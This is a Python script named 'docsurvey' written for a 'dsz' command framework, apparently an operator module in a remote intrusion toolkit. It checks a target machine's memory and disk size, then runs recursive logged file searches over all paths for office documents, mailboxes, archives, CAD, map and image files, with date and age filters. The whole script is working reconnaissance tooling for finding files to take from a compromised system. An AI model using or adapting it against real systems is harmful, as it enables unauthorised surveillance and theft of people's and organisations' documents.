
import dsz, dsz.control, dsz.cmd, dsz.ui, dsz.menu
import sys, time
import ops.data
from ops.pprint import pprint
import re

def checkmemory():
    memobject = None
    dsz.control.echo.Off()
    cmd = 'memory'
    (succ, memcmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    try:
        memobject = ops.data.getDszObject(cmdid=memcmdid, cmdname='memory')
    except:
        dsz.ui.Echo('There was an issue with the ops.data.getDszObject.', dsz.ERROR)
        return 0
    physicalload = memobject.memoryitem.physicalload
    if (physicalload is None):
        dsz.ui.Echo("Couldn't determine physical load. Proceed with caution.", dsz.ERROR)
    if (physicalload > 85):
        if (not dsz.ui.Prompt(('Physical load is at %s%%. Are you sure you want to continue?' % physicalload), False)):
            return 0
    return 1

def checkdrives():
    drivesobject = None
    dsz.control.echo.Off()
    cmd = 'drives'
    (succ, drivescmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    try:
        drivesobject = ops.data.getDszObject(cmdid=drivescmdid, cmdname='drives')
    except:
        dsz.ui.Echo('There was an issue with the ops.data.getDszObject.', dsz.ERROR)
        return 0
    diskspaceobject = None
    dsz.control.echo.Off()
    cmd = 'diskspace'
    (succ, diskspacecmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    try:
        diskspaceobject = ops.data.getDszObject(cmdid=diskspacecmdid, cmdname='diskspace')
    except:
        dsz.ui.Echo('There was an issue with the ops.data.getDszObject.', dsz.ERROR)
        return 0
    diskspace_list = {}
    for drive in diskspaceobject.drive:
        diskspace_list[drive.path] = drive.total
    for drive in drivesobject.driveitem:
        if (drive.type == 'Fixed'):
            if (diskspace_list[drive.drive] > 100000000000L):
                gigspace = (diskspace_list[drive.drive] // 1073741824)
                dsz.ui.Echo(('%s is %s bytes. ( %s GB )' % (drive.drive, diskspace_list[drive.drive], gigspace)), dsz.WARNING)
                if (not dsz.ui.Prompt('Large drive detected. Are you sure you want to continue?', False)):
                    return 0
    return 1

def dordir(mask_list):
    for mask in mask_list:
        cmd = ('background log dir -mask *%s -path * -recursive -max 0' % mask)
        if (afterdate is not None):
            cmd = ('%s -after "%s"' % (cmd, afterdate))
        if (beforedate is not None):
            cmd = ('%s -before "%s"' % (cmd, beforedate))
        if (age is not None):
            cmd = ('%s -age "%s"' % (cmd, age))
        dsz.ui.Echo(("Running: '%s'" % cmd))
        dsz.control.echo.Off()
        (succ, dircmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
        dsz.control.echo.On()
    return True

def setdate(datetype):
    datere = re.compile('^([12][09][0123456789]{2})-([01]{0,1}[0123456789]{1})-([0123]{0,1}[0123456789]{1})$')
    datetimere = re.compile('^([12][09][0123456789]{2})-([01]{0,1}[0123456789]{1})-([0123]{0,1}[0123456789]{1}) ([012]{0,1}[0123456789]{1}):([012345]{0,1}[0123456789]{1}):([012345]{0,1}[0123456789]{1})$')
    if ((datetype == 'after') or (datetype == 'before')):
        newdate = dsz.ui.GetString('Please enter the date in YYYY-MM-DD [hh:mm:ss] format: ')
        if (datere.match(newdate) or datetimere.match(newdate)):
            if (datetype == 'before'):
                global beforedate
                beforedate = newdate
            else:
                global afterdate
                afterdate = newdate
        else:
            dsz.ui.Echo('Invalid date.', dsz.ERROR)
            return 0
    else:
        newage = dsz.ui.GetString('Please enter the age: ')
        global age
        agere = re.compile('^([0123456789]*d){0,1}([0123456789]*h){0,1}([012345]{0,1}[0123456789]{1}m){0,1}([012345]{0,1}[0123456789]{1}s){0,1}$')
        if agere.match(newage):
            global age
            age = newage
        else:
            dsz.ui.Echo('Invalid age.', dsz.ERROR)
            return 0

def __main__(arguments):
    if (not checkmemory()):
        return 0
    if (not checkdrives()):
        return 0
    global afterdate
    afterdate = None
    global beforedate
    beforedate = None
    global age
    age = None
    standard_list = ['.doc', '.xls', '.ppt', '.vsd']
    office_list = ['.docx', '.docm', '.dotx', '.dotm', '.eml', '.xlsx', '.xlsm', '.xltx', '.xltm', '.pptx', '.pptm', '.potx', '.ppsx', '.ppsm', '.vdw', '.CSV', '.MDB', '.PPS', '.RTF', '.WPS', '.PLN', '.PDF', '.ODT', '.ODS', '.ODP', '.ODG', '.ODF', '.NSF', '.NTF', '.MPP', '.MSP', '.TXT']
    archives_list = ['.ZIP', '.RAR', '.TGZ', '.GZ', '.BZ2']
    design_list = ['.CDR', '.dwg', '.dxf', '.dak', '.dxx', '.ipt', '.iam', '.rvt', '.rte', '.3ds', '.max', '.dwf', '.dgn', '.dae', '.fbx', '.ofl', '.flt', '.cgr', '.stl']
    image_list = ['.psd', '.png', '.dat', '.gpg', '.bak', '.bmp', '.jpg', '.jpeg', '.mpg', '.mpeg', '.avi', '.wmv']
    model_list = ['.shp', '.kmz', '.kml', '.MDL', '.MA', '.M', '.MAT']
    misc_list = ['.mbx', '.pdf', '.ini', '.mdf', '.cfg', '.wab', '.tif', '.dbx', '.ost', '.pst', '.net', '.skr', '.msg', '.tbb', '.log', '.cry']
    menu_list = list()
    menu_list.append({dsz.menu.Name: 'Standard', dsz.menu.Function: dordir, dsz.menu.Parameter: standard_list})
    menu_list.append({dsz.menu.Name: 'Office', dsz.menu.Function: dordir, dsz.menu.Parameter: office_list})
    menu_list.append({dsz.menu.Name: 'Archives', dsz.menu.Function: dordir, dsz.menu.Parameter: archives_list})
    menu_list.append({dsz.menu.Name: 'Design', dsz.menu.Function: dordir, dsz.menu.Parameter: design_list})
    menu_list.append({dsz.menu.Name: 'Image/Video', dsz.menu.Function: dordir, dsz.menu.Parameter: image_list})
    menu_list.append({dsz.menu.Name: 'Map/Model', dsz.menu.Function: dordir, dsz.menu.Parameter: model_list})
    menu_list.append({dsz.menu.Name: 'Misc', dsz.menu.Function: dordir, dsz.menu.Parameter: misc_list})
    menu_list.append({dsz.menu.Name: 'Set After Date', dsz.menu.Function: setdate, dsz.menu.Parameter: 'after'})
    menu_list.append({dsz.menu.Name: 'Set Before Date', dsz.menu.Function: setdate, dsz.menu.Parameter: 'before'})
    menu_list.append({dsz.menu.Name: 'Set Age', dsz.menu.Function: setdate, dsz.menu.Parameter: 'age'})
    index = 0
    while (not (index == (-1))):
        (output, index) = dsz.menu.ExecuteSimpleMenu(('\n============================\ndocsurvey\n============================\nCurrent after date: %s\nCurrent before date: %s\nCurrent age: %s\n============================\n' % (afterdate, beforedate, age)), menu_list)
        if (index == (-1)):
            break
if (__name__ == '__main__'):
    try:
        __main__(sys.argv[1:])
    except RuntimeError as e:
        dsz.ui.Echo(('\nCaught RuntimeError: %s' % e), dsz.ERROR)